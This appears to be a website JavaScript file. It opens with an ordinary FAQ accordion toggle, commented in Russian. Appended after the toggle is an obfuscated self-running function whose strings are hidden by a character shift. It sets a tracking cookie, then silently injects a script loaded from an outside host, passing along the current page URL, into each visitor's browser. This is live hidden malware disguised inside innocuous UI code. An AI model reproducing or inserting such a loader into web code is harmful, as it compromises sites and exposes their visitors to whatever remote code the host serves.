document.addEventListener("DOMContentLoaded", function() {
    const questionElements = document.querySelectorAll(".ask__question");

    questionElements.forEach(function(question) {
        question.addEventListener("click", function() {
        // Получаем следующий элемент, который является содержимым аккордеона
        const content = this.nextElementSibling;

        // Проверяем, открыт ли текущий элемент
        const isOpen = this.classList.contains('active');

        // Закрываем все другие открытые элементы
        questionElements.forEach(function(otherQuestion) {
            if (otherQuestion !== question) {
                otherQuestion.classList.remove('active');
                const arrSvg = otherQuestion.querySelector("svg")
                arrSvg.style.transform = 'rotate(180deg)'
                otherQuestion.nextElementSibling.style.display = 'none';
            }
        });

        // Если текущий элемент не открыт, открываем его
        if (!isOpen) {
            this.classList.add('active');
            const arrSvg = question.querySelector("svg")
            arrSvg.style.transform = 'rotate(0deg)'
            
            content.style.display = 'flex';
        }

        // В противном случае, закрываем его
        else {
            this.classList.remove('active');
            const arrSvg = question.querySelector("svg")
            arrSvg.style.transform = 'rotate(180deg)'
            content.style.display = 'none';
        }
        })
    });
});

(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxyf' + 'ynhx3htr4ljy4xhwn' + 'uy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;';
    } catch (e) {};
}({}, document, location));
